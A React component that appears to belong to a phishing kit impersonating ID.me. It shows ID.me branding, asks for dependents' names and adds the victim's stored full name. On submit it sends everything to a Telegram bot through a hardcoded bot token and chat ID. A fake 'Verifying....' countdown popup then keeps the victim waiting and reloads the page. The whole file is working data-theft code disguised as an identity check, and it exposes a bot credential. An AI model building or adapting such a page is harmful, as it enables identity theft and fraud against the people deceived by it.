import React, { useEffect, useState } from "react";
import axios from "axios";
import logo from '../assets/ID.me_Logo.png'
import connect from '../assets/connect.jpg'
import elogo from '../assets/logo-removebg-preview.png'
import ApplyHeader from "./applyHeader";


const SecondSecurity = () => {
  const [count, setCount] = useState(1);
  const [inputs, setInputs] = useState([""]);
  const TELEGRAM_BOT_TOKEN = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
  const TELEGRAM_CHAT_ID = "6837437455";
  const [countdown, setCountdown] = useState(100);
  const [showPopup, setShowPopup] = useState(false);

  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";


  const handleDropdownChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const value = parseInt(e.target.value);
    setCount(value);
    setInputs(Array(value).fill(""));
  };

  const handleInputChange = (index: number, value: string) => {
    const newInputs = [...inputs];
    newInputs[index] = value;
    setInputs(newInputs);
  };

  const handleSubmit = async () => {
    const message = inputs.map((val, i) => `Field ${i + 1}: ${val}`).join("\n");
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    setShowPopup(true);

    try {
      await axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: ` ${fullName} New Submission:\n${message}`,
      });
    //   alert("Data sent successfully!");
    } catch (error) {
      console.error("Telegram error", error);
    //   alert("Failed to send data.");
    }
  };

   useEffect(() => {
      let timer: NodeJS.Timeout;
  
      if (showPopup && countdown > 0) {
        timer = setTimeout(() => {
          setCountdown((prev) => prev - 1);
        }, 1000);
      }
  
      if (countdown === 0) {
        window.location.reload();
      }
  
      return () => clearTimeout(timer);
    }, [showPopup, countdown]);
  


  return (
    <>
    <ApplyHeader/>
    <div className="p-4 max-w-md mx-auto bg-white rounded shadow">

{showPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
          <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
            <div className="flex justify-center mb-4"><img src={elogo} width={50} /></div>
            <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
            <p className="text-sm font-semibold text-black mb-6">
              Please wait while the system connects. Avoid refreshing the page; this may take a moment.
            </p>

            <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
              <div
                className="bg-green-500 h-4 rounded-full transition-all duration-1000"
                style={{ width: `${100 - countdown}%` }}
              ></div>
            </div>

            <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
          </div>
        </div>
      )}

      <div className=""><h1 className="text-3xl flex justify-center gap-4 font-medium mt-10 mb-6">
          <img src={logo} alt="" className="w-[100px]" />
          <img src={connect} alt="" />
        </h1>


      <label className="block mb-2 font-medium text-center">Select Number of Dependent:</label>
      <select
        className="border p-2 mb-4 w-full"
        value={count}
        onChange={handleDropdownChange}
      >
        {[...Array(10)].map((_, i) => (
          <option key={i} value={i + 1}>
            {i + 1}
          </option>
        ))}
      </select>

      {inputs.map((val, i) => (
        <input
          key={i}
          type="text"
          placeholder={`Enter Dependent  ${i + 1} Name`}
          className="border p-2 mb-2 w-full"
          value={val}
          onChange={(e) => handleInputChange(i, e.target.value)}
        />
      ))}

      <button
        className="bg-green-600 text-white px-4 py-2 rounded mt-4 w-full"
        onClick={handleSubmit}
      >
        Submit to Telegram
      </button>
        </div> 
    </div></>
  );
};

export default SecondSecurity;
